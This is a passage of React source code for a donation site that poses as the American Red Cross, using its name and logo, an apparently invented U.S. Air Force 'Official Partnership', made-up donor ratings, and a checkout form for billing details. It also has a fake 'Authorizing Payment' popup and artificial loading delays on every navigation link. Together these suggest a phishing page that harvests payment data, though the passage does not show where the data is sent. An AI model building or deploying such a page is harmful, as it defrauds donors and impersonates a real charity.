                            <label className="block text-sm font-medium text-gray-700 mb-2">City *</label>
                            <input
                              type="text"
                              required
                              value={formData.city}
                              onChange={(e) => setFormData({ ...formData, city: e.target.value })}
                              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none"
                            />
                          </div>
                          <div>
                            <label className="block text-sm font-medium text-gray-700 mb-2">State *</label>
                            <select
                              required
                              value={formData.state}
                              onChange={(e) => setFormData({ ...formData, state: e.target.value })}
                              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none"
                            >
                              <option value="">Select State</option>
                              <option value="AL">Alabama</option>
                              <option value="AK">Alaska</option>
                              <option value="AZ">Arizona</option>
                              <option value="AR">Arkansas</option>
                              <option value="CA">California</option>
                              <option value="CO">Colorado</option>
                              <option value="CT">Connecticut</option>
                              <option value="DE">Delaware</option>
                              <option value="FL">Florida</option>
                              <option value="GA">Georgia</option>
                              <option value="HI">Hawaii</option>
                              <option value="ID">Idaho</option>
                              <option value="IL">Illinois</option>
                              <option value="IN">Indiana</option>
                              <option value="IA">Iowa</option>
                              <option value="KS">Kansas</option>
                              <option value="KY">Kentucky</option>
                              <option value="LA">Louisiana</option>
                              <option value="ME">Maine</option>
                              <option value="MD">Maryland</option>
                              <option value="MA">Massachusetts</option>
                              <option value="MI">Michigan</option>
                              <option value="MN">Minnesota</option>
                              <option value="MS">Mississippi</option>
                              <option value="MO">Missouri</option>
                              <option value="MT">Montana</option>
                              <option value="NE">Nebraska</option>
                              <option value="NV">Nevada</option>
                              <option value="NH">New Hampshire</option>
                              <option value="NJ">New Jersey</option>
                              <option value="NM">New Mexico</option>
                              <option value="NY">New York</option>
                              <option value="NC">North Carolina</option>
                              <option value="ND">North Dakota</option>
                              <option value="OH">Ohio</option>
                              <option value="OK">Oklahoma</option>
                              <option value="OR">Oregon</option>
                              <option value="PA">Pennsylvania</option>
                              <option value="RI">Rhode Island</option>
                              <option value="SC">South Carolina</option>
                              <option value="SD">South Dakota</option>
                              <option value="TN">Tennessee</option>
                              <option value="TX">Texas</option>
                              <option value="UT">Utah</option>
                              <option value="VT">Vermont</option>
                              <option value="VA">Virginia</option>
                              <option value="WA">Washington</option>
                              <option value="WV">West Virginia</option>
                              <option value="WI">Wisconsin</option>
                              <option value="WY">Wyoming</option>
                              <option value="DC">Washington DC</option>
                            </select>
                          </div>
                        </div>
                        <div className="grid grid-cols-2 gap-4">
                          <div>
                            <label className="block text-sm font-medium text-gray-700 mb-2">ZIP Code *</label>
                            <input
                              type="text"
                              placeholder="12345"
                              required
                              maxLength={10}
                              value={formData.zipCode}
                              onChange={(e) => setFormData({ ...formData, zipCode: e.target.value })}
                              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none"
                            />
                          </div>
                          <div>
                            <label className="block text-sm font-medium text-gray-700 mb-2">Country *</label>
                            <select
                              required
                              value={formData.country}
                              onChange={(e) => setFormData({ ...formData, country: e.target.value })}
                              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none"
                            >
                              <option value="United States">United States</option>
                              <option value="Canada">Canada</option>
                              <option value="United Kingdom">United Kingdom</option>
                              <option value="Australia">Australia</option>
                              <option value="Other">Other</option>
                            </select>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Submit Button */}
                    <button
                      type="submit"
                      className="w-full btn-red-cross py-4 rounded-xl text-white font-bold text-lg flex items-center justify-center space-x-2"
                    >
                      <Lock className="w-5 h-5" />
                      <span>Complete Payment</span>
                    </button>

                    {/* Security Badges */}
                    <div className="mt-6 flex items-center justify-center space-x-6 text-gray-400">
                      <div className="flex items-center space-x-2">
                        <ShieldCheck className="w-5 h-5" />
                        <span className="text-sm">SSL Secured</span>
                      </div>
                      <div className="flex items-center space-x-2">
                        <Lock className="w-5 h-5" />
                        <span className="text-sm">256-bit Encryption</span>
                      </div>
                    </div>
                  </form>
                </div>
              </div>

              {/* Right Column - Order Summary */}
              <div className="lg:col-span-1">
                <div className="bg-white rounded-2xl shadow-lg p-6 sticky top-24">
                  <h3 className="font-display text-xl font-bold text-gray-900 mb-6">Donation Summary</h3>
                  
                  <div className="flex items-center space-x-4 mb-6 pb-6 border-b">
                    <RedCrossLogo className="w-16 h-16" />
                    <div>
                      <div className="font-semibold text-gray-900">American Red Cross</div>
                      <div className="text-sm text-gray-500">
                        {selectedCause ? causes.find(c => c.id === selectedCause)?.title : 'Where It\'s Needed Most'}
                      </div>
                    </div>
                  </div>

                  <div className="space-y-3 mb-6">
                    <div className="flex justify-between">
                      <span className="text-gray-600">Donation Amount</span>
                      <span className="font-semibold">${formData.customAmount || formData.amount}</span>
                    </div>
                    {formData.dedicate && (
                      <div className="flex justify-between">
                        <span className="text-gray-600">Dedication</span>
                        <span className="font-semibold text-right">{formData.dedicateName}</span>
                      </div>
                    )}
                    {formData.coverFees && (
                      <div className="flex justify-between">
                        <span className="text-gray-600">Cover Fees</span>
                        <span className="font-semibold">${((parseFloat(formData.customAmount || formData.amount) * 0.029) + 0.30).toFixed(2)}</span>
                      </div>
                    )}
                  </div>

                    <div className="border-t pt-4">
                    <div className="flex justify-between items-center">
                      <span className="text-lg font-semibold text-gray-900">Total</span>
                      <span className="text-2xl font-bold text-red-600">
                        ${formData.coverFees
                          ? (parseFloat(formData.customAmount || formData.amount) * 1.029 + 0.30).toFixed(2)
                          : formData.customAmount || formData.amount}
                      </span>
                    </div>
                  </div>

                  <div className="mt-6 p-4 bg-red-50 rounded-xl">
                    <p className="text-sm text-red-800">
                      <span className="font-semibold">Tax Deductible:</span> The American Red Cross is a 501(c)(3) nonprofit. Your donation is tax-deductible to the fullest extent allowed by law.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
        
        {/* Payment Processing Popup - Modern Gateway Style */}
        <AnimatePresence>
          {isPaymentProcessing && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="fixed inset-0 z-[70] flex items-center justify-center bg-black/60 backdrop-blur-md"
            >
              <motion.div
                initial={{ scale: 0.8, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                exit={{ scale: 0.8, opacity: 0 }}
                className="text-center"
              >
                {/* Modern Circle Motion Animation */}
                <div className="relative w-32 h-32 mx-auto mb-8">
                  {/* Outer rotating ring */}
                  <motion.div
                    animate={{ rotate: 360 }}
                    transition={{ duration: 3, repeat: Infinity, ease: 'linear' }}
                    className="absolute inset-0 rounded-full border-4 border-transparent border-t-white border-r-white/30"
                  />
                  {/* Middle rotating ring */}
                  <motion.div
                    animate={{ rotate: -360 }}
                    transition={{ duration: 2, repeat: Infinity, ease: 'linear' }}
                    className="absolute inset-3 rounded-full border-4 border-transparent border-b-white border-l-white/50"
                  />
                  {/* Inner rotating ring */}
                  <motion.div
                    animate={{ rotate: 360 }}
                    transition={{ duration: 1.5, repeat: Infinity, ease: 'linear' }}
                    className="absolute inset-6 rounded-full border-4 border-transparent border-t-white/80"
                  />
                  {/* Center dot */}
                  <div className="absolute inset-0 flex items-center justify-center">
                    <motion.div
                      animate={{ scale: [1, 1.2, 1] }}
                      transition={{ duration: 1, repeat: Infinity }}
                      className="w-4 h-4 bg-white rounded-full"
                    />
                  </div>
                </div>
                
                {/* Text */}
                <motion.h2 
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.2 }}
                  className="text-2xl font-bold text-white mb-3"
                >
                  Authorizing Payment
                </motion.h2>
                
                <motion.p 
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  transition={{ delay: 0.4 }}
                  className="text-white/70 text-sm"
                >
                  Please wait...
                </motion.p>
                
                {/* Security Badge */}
                <motion.div 
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  transition={{ delay: 0.6 }}
                  className="mt-8 flex items-center justify-center space-x-2 text-white/50 text-xs"
                >
                  <Lock className="w-3 h-3" />
                  <span>Secure 256-bit encryption</span>
                </motion.div>
              </motion.div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Navigation */}
      <nav
        className={`fixed top-0 left-0 right-0 z-50 transition-all duration-300 ${
          isScrolled ? 'bg-white shadow-lg' : 'bg-transparent'
        }`}
      >
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-20">
            {/* Logo */}
            <a href="#" className="flex items-center space-x-3">
              <RedCrossLogo className={`w-12 h-12 ${isScrolled ? '' : 'drop-shadow-lg'}`} />
              <span className={`font-display font-bold text-2xl ${isScrolled ? 'text-gray-900' : 'text-white'}`}>
                Red Cross
              </span>
            </a>

            {/* Desktop Navigation */}
            <div className="hidden md:flex items-center space-x-8">
              <a href="#causes" onClick={async (e) => { e.preventDefault(); setIsLoading(true); setLoadingMessage('Loading...'); await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5))); setIsLoading(false); window.location.href='#causes'; }} className={`font-medium hover:text-red-500 transition-colors ${isScrolled ? 'text-gray-700' : 'text-white'}`}>
                Causes
              </a>
              <a href="#impact" onClick={async (e) => { e.preventDefault(); setIsLoading(true); setLoadingMessage('Loading...'); await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5))); setIsLoading(false); window.location.href='#impact'; }} className={`font-medium hover:text-red-500 transition-colors ${isScrolled ? 'text-gray-700' : 'text-white'}`}>
                Impact
              </a>
              <a href="#partnership" onClick={async (e) => { e.preventDefault(); setIsLoading(true); setLoadingMessage('Loading...'); await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5))); setIsLoading(false); window.location.href='#partnership'; }} className={`font-medium hover:text-red-500 transition-colors ${isScrolled ? 'text-gray-700' : 'text-white'}`}>
                Partnership
              </a>
              <a href="#about" onClick={async (e) => { e.preventDefault(); setIsLoading(true); setLoadingMessage('Loading...'); await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5))); setIsLoading(false); window.location.href='#about'; }} className={`font-medium hover:text-red-500 transition-colors ${isScrolled ? 'text-gray-700' : 'text-white'}`}>
                About
              </a>
              <a href="#faq" onClick={async (e) => { e.preventDefault(); setIsLoading(true); setLoadingMessage('Loading...'); await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5))); setIsLoading(false); window.location.href='#faq'; }} className={`font-medium hover:text-red-500 transition-colors ${isScrolled ? 'text-gray-700' : 'text-white'}`}>
                FAQ
              </a>
              <a href="#contact" onClick={async (e) => { e.preventDefault(); setIsLoading(true); setLoadingMessage('Loading...'); await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5))); setIsLoading(false); window.location.href='#contact'; }} className={`font-medium hover:text-red-500 transition-colors ${isScrolled ? 'text-gray-700' : 'text-white'}`}>
                Contact
              </a>
            </div>

            {/* CTA Button */}
            <div className="hidden md:flex items-center space-x-4">
              <button
                onClick={() => handleDonateClick()}
                className="btn-red-cross px-6 py-3 rounded-full text-white font-semibold flex items-center space-x-2"
              >
                <Heart className="w-5 h-5" />
                <span>Donate Now</span>
              </button>
            </div>

            {/* Mobile Menu Button */}
            <button
              onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
              className={`md:hidden p-2 ${isScrolled ? 'text-gray-900' : 'text-white'}`}
            >
              {mobileMenuOpen ? <X className="w-6 h-6" /> : <Menu className="w-6 h-6" />}
            </button>
          </div>
        </div>

        {/* Mobile Menu */}
        <AnimatePresence>
          {mobileMenuOpen && (
            <motion.div
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: 'auto' }}
              exit={{ opacity: 0, height: 0 }}
              className="md:hidden bg-white border-t"
            >
              <div className="px-4 py-4 space-y-4">
                <a href="#causes" onClick={async () => { 
                  setIsLoading(true); 
                  setLoadingMessage('Loading...'); 
                  await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5))); 
                  setIsLoading(false); 
                  setMobileMenuOpen(false); 
                }} className="block text-gray-700 font-medium">
                  Causes
                </a>
                <a href="#impact" onClick={async () => { 
                  setIsLoading(true); 
                  setLoadingMessage('Loading...'); 
                  await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5))); 
                  setIsLoading(false); 
                  setMobileMenuOpen(false); 
                }} className="block text-gray-700 font-medium">
                  Impact
                </a>
                <a href="#partnership" onClick={async () => { 
                  setIsLoading(true); 
                  setLoadingMessage('Loading...'); 
                  await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5))); 
                  setIsLoading(false); 
                  setMobileMenuOpen(false); 
                }} className="block text-gray-700 font-medium">
                  Partnership
                </a>
                <a href="#about" onClick={async () => { 
                  setIsLoading(true); 
                  setLoadingMessage('Loading...'); 
                  await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5))); 
                  setIsLoading(false); 
                  setMobileMenuOpen(false); 
                }} className="block text-gray-700 font-medium">
                  About
                </a>
                <a href="#faq" onClick={async () => { 
                  setIsLoading(true); 
                  setLoadingMessage('Loading...'); 
                  await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5))); 
                  setIsLoading(false); 
                  setMobileMenuOpen(false); 
                }} className="block text-gray-700 font-medium">
                  FAQ
                </a>
                <a href="#contact" onClick={async () => { 
                  setIsLoading(true); 
                  setLoadingMessage('Loading...'); 
                  await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5))); 
                  setIsLoading(false); 
                  setMobileMenuOpen(false); 
                }} className="block text-gray-700 font-medium">
                  Contact
                </a>
                <button
                  onClick={async () => {
                    setIsLoading(true);
                    setLoadingMessage('Loading...');
                    await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5)));
                    setIsLoading(false);
                    setMobileMenuOpen(false);
                    handleDonateClick();
                  }}
                  className="w-full btn-red-cross px-6 py-3 rounded-full text-white font-semibold flex items-center justify-center space-x-2"
                >
                  <Heart className="w-5 h-5" />
                  <span>Donate Now</span>
                </button>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </nav>

      {/* Hero Section */}
      <section className="relative min-h-screen flex items-center justify-center overflow-hidden">
        {/* Background Image with Overlay */}
        <div className="absolute inset-0 bg-gradient-to-br from-red-700 via-red-600 to-red-800">
          <div className="absolute inset-0 bg-black/30" />
          <div className="absolute inset-0" style={{
            backgroundImage: `url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")`,
          }} />
        </div>

        {/* Hero Content */}
        <div className="relative z-10 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-32">
          <motion.div
            initial="hidden"
            animate="visible"
            variants={staggerContainer}
            className="text-center"
          >
            <motion.div variants={fadeInUp} className="inline-flex items-center space-x-2 bg-white/10 backdrop-blur-sm rounded-full px-6 py-2 mb-8">
              <Star className="w-5 h-5 text-yellow-400 fill-yellow-400" />
              <span className="text-white font-medium">4.9/5 Rating from 50,000+ Donors</span>
            </motion.div>

            <motion.h1
              variants={fadeInUp}
              className="font-display text-5xl md:text-7xl font-bold text-white mb-6 leading-tight"
            >
              Your Gift Saves
              <br />
              <span className="text-yellow-300">Lives</span>
            </motion.h1>

            <motion.p
              variants={fadeInUp}
              className="text-xl md:text-2xl text-white/90 mb-10 max-w-3xl mx-auto"
            >
              Join millions of donors providing emergency relief, blood services, and hope to communities in crisis around the world.
            </motion.p>

            <motion.div
              variants={fadeInUp}
              className="flex flex-col sm:flex-row items-center justify-center gap-4"
            >
              <button
                onClick={() => handleDonateClick()}
                className="btn-red-cross px-10 py-5 rounded-full text-white font-bold text-lg flex items-center space-x-3 animate-pulse-red"
              >
                <Heart className="w-6 h-6" />
                <span>Donate Now</span>
              </button>
              <a
                href="#causes"
                className="px-10 py-5 rounded-full bg-white/10 backdrop-blur-sm text-white font-semibold text-lg border-2 border-white/30 hover:bg-white/20 transition-all flex items-center space-x-3"
              >
                <span>Explore Causes</span>
                <ArrowRight className="w-5 h-5" />
              </a>
            </motion.div>

            {/* Trust Indicators */}
            <motion.div
              variants={fadeInUp}
              className="mt-16 grid grid-cols-2 md:grid-cols-4 gap-8 max-w-4xl mx-auto"
            >
              {[
                { icon: ShieldCheck, label: '501(c)(3) Certified' },
                { icon: Lock, label: 'Secure Payment' },
                { icon: TrendingUp, label: '90% to Programs' },
                { icon: Award, label: '4-Star Charity' },
              ].map((item, index) => (
                <div key={index} className="flex flex-col items-center text-white/80">
                  <item.icon className="w-8 h-8 mb-2" />
                  <span className="text-sm font-medium">{item.label}</span>
                </div>
              ))}
            </motion.div>
          </motion.div>
        </div>

        {/* Scroll Indicator */}
        <motion.div
          animate={{ y: [0, 10, 0] }}
          transition={{ duration: 2, repeat: Infinity }}
          className="absolute bottom-8 left-1/2 transform -translate-x-1/2"
        >
          <ChevronDown className="w-8 h-8 text-white/60" />
        </motion.div>
      </section>

      {/* Emergency Banner */}
      <div className="bg-red-600 py-4">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex flex-col md:flex-row items-center justify-between">
            <div className="flex items-center space-x-3 mb-4 md:mb-0">
              <div className="w-3 h-3 bg-yellow-400 rounded-full animate-pulse" />
              <span className="text-white font-semibold">Active Emergency: Hurricane Relief Fund</span>
            </div>
            <div className="flex items-center space-x-6 text-white/90 text-sm">
              <span>$2.4M raised of $5M goal</span>
              <div className="w-32 h-2 bg-red-800 rounded-full overflow-hidden">
                <div className="w-1/2 h-full bg-yellow-400 rounded-full" />
              </div>
              <button
                onClick={() => handleDonateClick('disaster')}
                className="bg-white text-red-600 px-4 py-2 rounded-full font-semibold text-sm hover:bg-gray-100 transition-colors"
              >
                Donate Now
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Impact Statistics */}
      <section id="impact" className="py-20 bg-gray-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <motion.div
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true }}
            variants={staggerContainer}
            className="text-center mb-16"
          >
            <motion.h2 variants={fadeInUp} className="font-display text-4xl md:text-5xl font-bold text-gray-900 mb-4">
              Making a Real Impact
            </motion.h2>
            <motion.p variants={fadeInUp} className="text-xl text-gray-600 max-w-2xl mx-auto">
              Every donation helps us respond to emergencies, collect life-saving blood, and train communities.
            </motion.p>
          </motion.div>

          <motion.div
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true }}
            variants={staggerContainer}
            className="grid grid-cols-2 md:grid-cols-4 gap-8"
          >
            {impactStats.map((stat, index) => (
              <motion.div
                key={index}
                variants={fadeInUp}
                className="bg-white rounded-2xl p-8 text-center shadow-lg hover:shadow-xl transition-shadow"
              >
                <div className={`w-16 h-16 mx-auto mb-4 rounded-full bg-gray-100 flex items-center justify-center`}>
                  <stat.icon className={`w-8 h-8 ${stat.color}`} />
                </div>
                <div className="text-4xl font-bold text-gray-900 mb-2">{stat.value}</div>
                <div className="text-gray-600">{stat.label}</div>
              </motion.div>
            ))}
          </motion.div>
        </div>
      </section>

      {/* US Air Force Partnership Section */}
      <section id="partnership" className="py-20 bg-gradient-to-br from-slate-900 via-blue-950 to-slate-900">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <motion.div
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true }}
            variants={staggerContainer}
            className="text-center mb-12"
          >
            <motion.div variants={fadeInUp} className="inline-flex items-center space-x-2 bg-white/10 backdrop-blur-sm rounded-full px-6 py-2 mb-6">
              <Plane className="w-5 h-5 text-blue-400" />
              <span className="text-white font-medium">Official Partnership</span>
            </motion.div>
            <motion.h2 variants={fadeInUp} className="font-display text-4xl md:text-5xl font-bold text-white mb-4">
              United States Air Force Partnership
            </motion.h2>
            <motion.p variants={fadeInUp} className="text-xl text-blue-200 max-w-3xl mx-auto">
              Proudly serving alongside the U.S. Air Force to support military families and personnel worldwide
            </motion.p>
          </motion.div>

          <div className="grid lg:grid-cols-2 gap-12 items-center">
            {/* US Air Force Logo */}
            <motion.div
              initial={{ opacity: 0, x: -50 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ once: true }}
              transition={{ duration: 0.6 }}
              className="flex justify-center"
            >
              <div className="relative">
                <USAirForceLogo className="w-48 h-48 md:w-64 md:h-64" />
                <div className="absolute -bottom-4 -right-4 bg-white rounded-full p-3 shadow-lg">
                  <RedCrossLogo className="w-16 h-16" />
                </div>
              </div>
            </motion.div>

            {/* Partnership Details */}
            <motion.div
              initial="hidden"
              whileInView="visible"
              viewport={{ once: true }}
              variants={staggerContainer}
            >
              <motion.h3 variants={fadeInUp} className="font-display text-2xl font-bold text-white mb-6">
                Supporting Those Who Serve
              </motion.h3>
              <motion.p variants={fadeInUp} className="text-gray-300 mb-6">
                The American Red Cross is proud to partner with the United States Air Force to provide critical support to active duty personnel, veterans, and their families. This partnership enables us to deliver emergency communication services, financial assistance, and family support programs to those who protect our nation.
              </motion.p>

              <motion.div variants={fadeInUp} className="grid sm:grid-cols-2 gap-4 mb-8">
                {[
                  { title: 'Emergency Communications', desc: '24/7 connection to deployed personnel' },
                  { title: 'Financial Assistance', desc: 'Emergency grants for military families' },
                  { title: 'Family Support', desc: 'Counseling and mental health services' },
                  { title: 'Veteran Services', desc: 'Transition support and resources' },
                ].map((item, index) => (
                  <div key={index} className="bg-white/5 backdrop-blur-sm rounded-xl p-4 border border-white/10">
                    <div className="font-semibold text-white mb-1">{item.title}</div>
                    <div className="text-sm text-gray-400">{item.desc}</div>
                  </div>
                ))}
              </motion.div>

              <motion.div variants={fadeInUp} className="bg-blue-600/20 border border-blue-400/30 rounded-xl p-6">
                <div className="flex items-start space-x-4">
                  <div className="w-12 h-12 rounded-full bg-blue-500/20 flex items-center justify-center flex-shrink-0">
                    <Shield className="w-6 h-6 text-blue-400" />
                  </div>
                  <div>
                    <h4 className="font-semibold text-white mb-2">Service to the Armed Forces</h4>
                    <p className="text-gray-300 text-sm mb-4">
                      Since 1911, the Red Cross has been supporting military members and their families. Your donation helps us continue this vital mission in partnership with the U.S. Air Force.
                    </p>
                    <button
                      onClick={() => handleDonateClick('military')}
                      className="inline-flex items-center space-x-2 text-blue-400 hover:text-blue-300 font-semibold transition-colors"
                    >
                      <span>Support Military Families</span>
                      <ArrowRight className="w-4 h-4" />
                    </button>
                  </div>
                </div>
              </motion.div>
            </motion.div>
          </div>
        </div>
      </section>

      {/* Causes Section */}
      <section id="causes" className="py-20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <motion.div
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true }}
            variants={staggerContainer}
            className="text-center mb-16"
          >
            <motion.span variants={fadeInUp} className="text-red-600 font-semibold text-lg">
              Our Programs
            </motion.span>
            <motion.h2 variants={fadeInUp} className="font-display text-4xl md:text-5xl font-bold text-gray-900 mt-2 mb-4">
              Choose Your Cause
            </motion.h2>
            <motion.p variants={fadeInUp} className="text-xl text-gray-600 max-w-2xl mx-auto">
              Direct your donation to the program that matters most to you.
            </motion.p>
          </motion.div>

          <motion.div
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true }}
            variants={staggerContainer}
            className="grid md:grid-cols-2 gap-8"
          >
            {causes.map((cause) => (
              <motion.div
                key={cause.id}
                variants={fadeInUp}
                className="bg-white rounded-2xl overflow-hidden shadow-lg hover:shadow-2xl transition-all group"
              >
                <div className="p-8">
                  <div className="flex items-start justify-between mb-6">
                    <div className="text-6xl">{cause.image}</div>
                    <span className="bg-red-100 text-red-600 px-4 py-1 rounded-full text-sm font-semibold">
                      {Math.round((cause.raised / cause.goal) * 100)}% Funded
                    </span>
                  </div>

                  <h3 className="font-display text-2xl font-bold text-gray-900 mb-3">{cause.title}</h3>
                  <p className="text-gray-600 mb-6">{cause.description}</p>

                  {/* Progress Bar */}
                  <div className="mb-4">
                    <div className="flex justify-between text-sm mb-2">
                      <span className="font-semibold text-gray-900">{formatCurrency(cause.raised)} raised</span>
                      <span className="text-gray-500">Goal: {formatCurrency(cause.goal)}</span>
                    </div>
                    <div className="h-3 bg-gray-200 rounded-full overflow-hidden">
                      <div
                        className="h-full bg-gradient-to-r from-red-500 to-red-600 rounded-full transition-all duration-1000"
                        style={{ width: `${Math.min((cause.raised / cause.goal) * 100, 100)}%` }}
                      />
                    </div>
                  </div>

                  <div className="flex items-center justify-between">
                    <div className="flex items-center text-gray-500 text-sm">
                      <Users className="w-4 h-4 mr-1" />
                      {cause.donors.toLocaleString()} donors
                    </div>
                    <button
                      onClick={() => handleDonateClick(cause.id)}
                      className="btn-red-cross px-6 py-3 rounded-full text-white font-semibold flex items-center space-x-2 group-hover:scale-105 transition-transform"
                    >
                      <Heart className="w-4 h-4" />
                      <span>Donate</span>
                    </button>
                  </div>
                </div>
              </motion.div>
            ))}
          </motion.div>

          {/* Quick Donate Section */}
          <motion.div
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true }}
            variants={fadeInUp}
            className="mt-16 bg-gradient-to-r from-red-600 to-red-700 rounded-3xl p-8 md:p-12 text-center"
          >
            <h3 className="font-display text-3xl md:text-4xl font-bold text-white mb-4">
              Where It&apos;s Needed Most
            </h3>
            <p className="text-white/90 mb-8 max-w-2xl mx-auto">
              Can&apos;t decide? Let us allocate your donation to the area of greatest need. This ensures funds reach those who need them most urgently.
            </p>
            <button
              onClick={() => handleDonateClick()}
              className="bg-white text-red-600 px-8 py-4 rounded-full font-bold text-lg hover:bg-gray-100 transition-colors inline-flex items-center space-x-2"
            >
              <Gift className="w-5 h-5" />
              <span>Donate to Greatest Need</span>
            </button>
          </motion.div>
        </div>
      </section>

      {/* How Your Donation Helps */}
      <section className="py-20 bg-gray-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <motion.div
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true }}
            variants={staggerContainer}
            className="text-center mb-16"
          >
            <motion.h2 variants={fadeInUp} className="font-display text-4xl md:text-5xl font-bold text-gray-900 mb-4">
              How Your Donation Helps
            </motion.h2>
            <motion.p variants={fadeInUp} className="text-xl text-gray-600 max-w-2xl mx-auto">
              See the tangible impact of your generosity at every giving level.
            </motion.p>
          </motion.div>

          <motion.div
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true }}
            variants={staggerContainer}
            className="grid md:grid-cols-3 gap-8"
          >
            {[
              {
                amount: '$25',
                impact: 'Provides a comfort kit with toiletries and essentials for a disaster survivor',
                icon: HandHeart,
              },
              {
                amount: '$100',
                impact: 'Covers the cost of one blood donation processing and testing',
                icon: Droplets,
              },
              {
                amount: '$250',
                impact: 'Trains 10 people in CPR and first aid, potentially saving lives in emergencies',
                icon: Shield,
              },
            ].map((item, index) => (
              <motion.div
                key={index}
                variants={fadeInUp}
                className="bg-white rounded-2xl p-8 text-center shadow-lg hover:shadow-xl transition-shadow"
              >
                <div className="text-4xl font-bold text-red-600 mb-4">{item.amount}</div>
                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-red-50 flex items-center justify-center">
                  <item.icon className="w-8 h-8 text-red-600" />
                </div>
                <p className="text-gray-600">{item.impact}</p>
              </motion.div>
            ))}
          </motion.div>
        </div>
      </section>

      {/* Testimonials */}
      <section className="py-20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <motion.div
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true }}
            variants={staggerContainer}
            className="text-center mb-16"
          >
            <motion.h2 variants={fadeInUp} className="font-display text-4xl md:text-5xl font-bold text-gray-900 mb-4">
              Stories of Impact
            </motion.h2>
            <motion.p variants={fadeInUp} className="text-xl text-gray-600 max-w-2xl mx-auto">
              Hear from our donors and those we&apos;ve helped.
            </motion.p>
          </motion.div>

          <motion.div
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true }}
            variants={staggerContainer}
            className="grid md:grid-cols-3 gap-8"
          >
            {testimonials.map((testimonial, index) => (
              <motion.div
                key={index}
                variants={fadeInUp}
                className="bg-white rounded-2xl p-8 shadow-lg"
              >
                <div className="flex items-center mb-4">
                  {[...Array(testimonial.rating)].map((_, i) => (
                    <Star key={i} className="w-5 h-5 text-yellow-400 fill-yellow-400" />
                  ))}
                </div>
                <p className="text-gray-600 mb-6 italic">&ldquo;{testimonial.quote}&rdquo;</p>
                <div className="flex items-center">
                  <div className="w-12 h-12 rounded-full bg-red-100 flex items-center justify-center text-red-600 font-bold mr-4">
                    {testimonial.image}
                  </div>
                  <div>
                    <div className="font-semibold text-gray-900">{testimonial.name}</div>
                    <div className="text-sm text-gray-500">{testimonial.role}</div>
                  </div>
                </div>
              </motion.div>
            ))}
          </motion.div>
        </div>
      </section>

      {/* About Section */}
      <section id="about" className="py-20 bg-gray-900 text-white">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid md:grid-cols-2 gap-16 items-center">
            <motion.div
              initial="hidden"
              whileInView="visible"
              viewport={{ once: true }}
              variants={staggerContainer}
            >
              <motion.span variants={fadeInUp} className="text-red-400 font-semibold text-lg">
                About Us
              </motion.span>
              <motion.h2 variants={fadeInUp} className="font-display text-4xl md:text-5xl font-bold mt-2 mb-6">
                140+ Years of Service
              </motion.h2>
              <motion.p variants={fadeInUp} className="text-gray-300 mb-6 text-lg">
